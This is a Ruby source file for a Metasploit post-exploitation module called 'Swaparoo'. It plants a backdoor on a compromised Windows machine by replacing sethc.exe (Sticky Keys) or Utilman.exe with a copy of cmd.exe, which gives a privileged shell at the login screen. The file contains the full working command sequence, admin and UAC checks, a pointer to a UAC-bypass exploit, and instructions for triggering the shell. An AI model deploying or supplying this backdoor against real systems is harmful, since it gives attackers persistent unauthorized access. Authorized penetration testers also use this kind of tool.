##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

#  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
#  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Swaparoo - A Windows Backdoor Method for Sethc.exe or Utilman.exe',
      'Description'   => %q{
        Sneaks a Backdoor Command Shell in place of Sticky Keys Prompt or 
        Utilman assistant at Windows Login Screen (requires privs)
      },
      'License'       => BSD_LICENSE,
      'Author'        => [ 
        'Osanda Malith Jayathissa <osandajayathissa[at]gmail.com>', 
        'HR <hood3drob1n[at]gmail.com>' 
      ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ 'Any' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('PATH', [ false, 'Path on target to Sethc.exe or Utilman.exe', '%SYSTEMROOT%\\\\system32\\\\' ]),
        OptBool.new(  'UTILMAN',   [ false, 'Use Utilman.exe instead of Sethc.exe', false]),
        OptBool.new(  'RESET',   [ false, 'Restore Original Sethc.exe or Utilman.exe', false])
      ], self.class)
  end

  # Only for standard windows meterpreter sessions
  def unsupported
    print_error("This version of Meterpreter is not supported with this script!")
    raise Rex::Script::Completed
  end

  # Need Admin Privs to make the swap
  def notadmin
    print_error("You need admin privs to run this!")
    print_error("Try using 'getsystem' or one of the many escalation scripts and try again.......")
    raise Rex::Script::Completed
  end

  # Execute our list of command needed to achieve the backdooring (sethc.exe vs Utilman.exe) or cleanup tasks :p
  def list_exec(cmdlst) # client is our meterpreter session, cmdlst is our array of commands to run on target
    r=''
    client.response_timeout=120
    cmdlst.each do |cmd|
      begin
        print_status("Executing: #{cmd}")
        r = client.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
        while(d = r.channel.read)
          break if d == ""
        end
        r.channel.close
        r.close
      rescue ::Exception => e
        print_error("Error Running Command #{cmd}: #{e.class} #{e}")
      end
    end
  end

  # Check if UAC is enabled
  # The builtin for privs isn't workign for me, so I made a new version using reg query.....
  # Returns integer value for UAC level
  def uac_enabled
    # Confirm target could have UAC, then find out level its running at if possible
    if client.sys.config.sysinfo['OS'] !~ /Windows Vista|Windows 2008|Windows [78]/
      uac = false
    else
      begin
        key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',KEY_READ)
        if key.query_value('EnableLUA').data == 1
          uac = true
          print_status("UAC is Enabled, checking level...")
          uac_level = key.query_value('ConsentPromptBehaviorAdmin').data 
          if uac_level.to_i == 2
            print_error("UAC is set to 'Always Notify'")
            print_error("Things won't work under these conditions.....")
            raise Rex::Script::Completed
          elsif uac_level.to_i == 5
            print_error("UAC is set to Default")
            print_error("Try running 'exploit/windows/local/bypassuac' to bypass UAC restrictions if you haven't already")
          elsif uac_level.to_i == 0
            print_good("UAC Settings Don't appear to be an issue...")
            uac = false
          else
            print_status("Unknown UAC Setting, if it doesn't work try things manually to see if UAC is blocking......")
            uac = false
          end
        end
        key.close if key
      rescue::Exception => e
        print_error("Error Checking UAC: #{e.class} #{e}")
      end
    end
    return uac
  end

  # Make the swap
  def run
    unsupported if client.platform !~ /win32|win64/i # Windows only

    # Make sure we are admin
    if client.railgun.shell32.IsUserAnAdmin()['return']
      print_good("Confirmed, currently running as admin.....")
    else
      notadmin
    end

    # Check if UAC is going to be a problem
    if uac_enabled
      print_error("Can't run this on target system without bypassing UAC first!")
      print_status("Please make sure you have already done this or script will not work......")
      print_status("")
    else
      print_good("Confirmed, UAC is not an issue!")
    end

    if datastore['PATH']
      path = datastore['PATH']
    else
      sysroot = client.fs.file.expand_path("%SYSTEMROOT%") # Expand to find root
      path = "#{sysroot}\\\\system32\\\\" # Dont forget to escape!
    end

    # Arrays with our commands we need to accomplish stuff
    sethc = [ "takeown /f #{path}sethc.exe", 
      "icacls #{path}sethc.exe /grant administrators:f", 
      "rename #{path}sethc.exe  sethc.exe.bak", 
      "copy #{path}cmd.exe #{path}cmd3.exe", 
      "rename #{path}cmd3.exe sethc.exe" ]

    utilman = [ "takeown /f #{path}Utilman.exe", 
      "icacls #{path}Utilman.exe /grant administrators:f", 
      "rename #{path}Utilman.exe  Utilman.exe.bak", 
      "copy #{path}cmd.exe #{path}cmd3.exe", 
      "rename #{path}cmd3.exe Utilman.exe" ]

    sethc_cleanup = [ "takeown /f #{path}sethc.exe", 
      "icacls #{path}sethc.exe /grant administrators:f",
      "takeown /f #{path}sethc.exe.bak", 
      "icacls #{path}sethc.exe.bak /grant Administrators:f",
      "del #{path}sethc.exe", 
      "rename #{path}sethc.exe.bak sethc.exe" ]

    utilman_cleanup = [ "takeown /f #{path}Utilman.exe", 
      "icacls #{path}Utilman.exe /grant administrators:f",
      "takeown /f #{path}utilman.exe.bak", 
      "icacls #{path}utilman.exe.bak /grant Administrators:f", 
      "del #{path}Utilman.exe", 
      "rename #{path}Utilman.exe.bak Utilman.exe" ]

    # Check which bin we need to go after
    if datastore['UTILMAN']
      target_sethc = false
    else
      target_sethc = true
    end

    # Check if we need to restore or make the swap
    if datastore['RESET']
      # Restore things back to original state if possible
      if target_sethc
        list_exec(sethc_cleanup)
      else
        list_exec(utilman_cleanup)
      end
    else
      # Make the swap...
      # Check for signs of previous backdooring before taking actions
      # If not, this can overwrite the backup file which means you can't cleanup afterwards!
      # Bail out if found and have user remove, rename, or run restore.....
      print_status("Starting the Swaparoo backdooring process.....")
      if target_sethc
        if client.fs.file.exists?("#{path}sethc.exe.bak")
          print_error("Target appears to have already been backdoored!")
          print_error("Delete or rename the backup file (sethc.exe.bak) manually or run the restore option...")
          raise Rex::Script::Completed
        else
          list_exec(sethc)
        end
      else
        if client.fs.file.exists?("#{path}utilman.exe.bak")
          print_error("Target appears to have already been backdoored!")
          print_error("Delete or rename the backup file (utilman.exe.bak) manually or run the restore option...")
          raise Rex::Script::Completed
        else
          list_exec(utilman)
        end
      end
    end

    # All done now
    print_status("Swaparoo module has completed!")
    if datastore['RESET']
      print_good("System should be restored back to normal!")
    else
      # Let them know how to access shell...
      if datastore['UTILMAN']
        print_good("Press the Windows key + U or Click on the Blue Help icon at lower left on Login Screen to access shell")
      else
        print_good("Press Shift Key 5 times at Login Screen to access shell!")
      end
    end
  end
end
